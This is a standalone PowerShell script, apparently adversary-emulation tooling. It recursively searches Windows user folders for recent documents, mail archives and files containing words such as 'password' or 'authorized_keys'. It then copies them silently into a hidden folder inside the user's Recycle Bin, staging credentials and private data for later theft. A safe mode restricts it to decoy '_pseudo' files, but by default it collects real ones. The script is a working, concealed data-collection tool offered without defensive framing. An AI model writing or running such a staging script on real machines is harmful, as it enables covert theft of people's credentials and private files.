Param (
    [string] $Extensions ='doc,xps,xls,ppt,pps,wps,wpd,ods,odt,lwp,jtd,pdf,zip,rar,docx,url,xlsx,pptx,ppsx,pst,ost,jpg,txt,lnk',
    [string] $ExcludedExtensions = 'exe,jar,dll,msi,bak,vmx,vmdx,vmdk,lck',
    [string] $Directories = 'c:\users',
    [string] $ExcludedDirectories = 'links,music,saved games,contacts,videos,source,onedrive',
    [string] $AccessedCutoff = -30,
    [string] $ModifiedCutoff = -30,
    [string] $SearchStrings = 'user,pass,username,password,key,authorized_keys',
    # Recycle bin located at c:\$Recycle.Bin\<sid of current user> (the '$' is literal, needs to be escaped in pwsh)
    [string] $StagingDirectory = 'Recycle Bin',
    [bool] $SafeMode = $False,
    [string] $PseudoExtension = '_pseudo'
)

function Parse-Extensions {
    param ([string] $extensions)
    $extArray = $extensions.Split(",");
    $extensionsList = New-Object System.Collections.ArrayList;

    if ($extArray[0] -match "all") {
        $extensionsList.add(".") | Out-Null
    } else {

        foreach($ext in $extArray) {
            $extensionsList.add(".$ext") | Out-Null
        }
    }

    return $extensionsList;
}

function Parse-IncludedDirectories {
    param ([string] $directories)
    $dirArray = $directories.Split(",");
    $dirList = New-Object System.Collections.ArrayList;

    foreach ($dir in $dirArray) {
            $dirList.Add($dir) | Out-Null
    }
    return $dirList;
}

function Parse-ExcludedDirectories {
    param ([string] $directories)
    $dirArray = $directories.Split(",");
    $dirString = "";

    if ($dirArray[0] -match "none") {
        return $dirArray[0]
    } else {
        foreach ($dir in $dirArray) {
            if ([array]::IndexOf($dirArray, $dir) -lt $dirArray.Count-1) {
                $dirString += "$dir|";
            } else {
                $dirString += "$dir";
            }
        }
    }
    return $dirString;
}

function Parse-SensitiveContents {
    param ([string] $contents)
    $sensitiveStringsArray = $contents.Split(",");

    return $sensitiveStringsArray;
}

function Create-StagingDirectory {
    param ([string] $stagingDirIn)
    $logDir = $stagingDirIn;
    $logFile = "";
    $stagingDirectory = "";
    if ($stagingDirIn -match "recycle[``|\s]+bin") {
        $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value;
        $logDir = "C:\`$Recycle.Bin\$sid";
    }

    try {
        if (Test-Path -Path "$($logDir)\s"){
            $stagingDirectory = Get-Item -Path "$($logDir)\s" -Force;
        } else {
            $stagingDirectory = New-Item -Path $logDir -Name "s" -ItemType "directory";
            $stagingDirectory.Attributes += "Hidden";
        }
    } catch {
        $logDir = "C:\Users\Public"
        if (Test-Path -Path "$($logDir)\s"){
            $stagingDirectory = Get-Item -Path "$($logDir)\s" -Force;
        } else {
            $stagingDirectory = New-Item -Path $logDir -Name "s" -ItemType "directory";
            $stagingDirectory.Attributes += "Hidden";
        }
    }

    Write-Host "$($stagingDirectory)";

    return $stagingDirectory;
}

function Find-Files {
    param (
        [Parameter(Mandatory=$true)] [System.Collections.ArrayList] $exts,
        [Parameter(Mandatory=$true)] [System.Collections.ArrayList] $excludedExts,
        [Parameter(Mandatory=$true)] [System.Collections.ArrayList] $incDirs,
        [Parameter(Mandatory=$true)] [string] $exDirs,
        [Parameter(Mandatory=$true)] [string] $accessed,
        [Parameter(Mandatory=$true)] [string] $modified,
        [Parameter(Mandatory=$true)] [string[]] $sensitive
    )

    $files = Get-ChildItem $incDirs -Recurse -ErrorAction SilentlyContinue | where { `
        (-not $_.PSIsContainer) `
        -and (($exDirs -notmatch "none") -and ((Split-Path -Path $_.FullName -Parent) -notmatch $exDirs)) `
        -and ((($exts[0] -eq ".") -and ($_.Extension -match $exts)) -or ($_.Extension -in $exts) `
            -or (($sensitiveStrings -notmatch "none") -and ($_ | Select-String -Pattern $sensitiveStrings -List))) `
        -and ($_.Extension -notin $excludedFileExtensions) `
        -and ((($accessed -notmatch "none") -and ($_.LastAccessTime -gt (Get-Date).AddDays($accessed))) `
            -or (($modified -notmatch "none") -and ($_.LastWriteTime -gt (Get-Date).AddDays($modified)))) `
    }

    return $files
}

function Stage-Files() {
    param(
        [Parameter(Mandatory=$true)] $files,
        [Parameter(Mandatory=$true)] [string] $stage,
        [Parameter(Mandatory=$true)] [string] $pseudo,
        [Parameter(Mandatory=$true)] [bool] $safe
    )

    ForEach ($f in $files){
        if($safe){
            if($f.BaseName -match "$($pseudo)$"){
                Copy-Item -Path $f.FullName -Destination $stage -Force -ErrorAction SilentlyContinue
            }
        } else {
            Copy-Item -Path $f.FullName -Destination $stage -Force -ErrorAction SilentlyContinue
        }
    }
}

$FileExtensions = [System.Collections.ArrayList]@(Parse-Extensions($Extensions));
$ExcludedFileExtensions = [System.Collections.ArrayList]@(Parse-Extensions($ExcludedExtensions));
$IncludedDirectories = [System.Collections.ArrayList]@(Parse-IncludedDirectories($Directories));
$ExcludedDirectories = Parse-ExcludedDirectories($ExcludedDirectories);
$SensitiveStrings = Parse-SensitiveContents($SearchStrings);
$StageDir = Create-StagingDirectory($StagingDirectory);
Start-Sleep -s 2;

$Files = Find-Files -exts $FileExtensions -excludedExts $ExcludedFileExtensions -incDirs $IncludedDirectories `
-exDirs $ExcludedDirectories -accessed $AccessedCutoff -modified $ModifiedCutoff -sensitive $SensitiveStrings;

Stage-Files -files $Files -safe $SafeMode -stage $StageDir -pseudo $PseudoExtension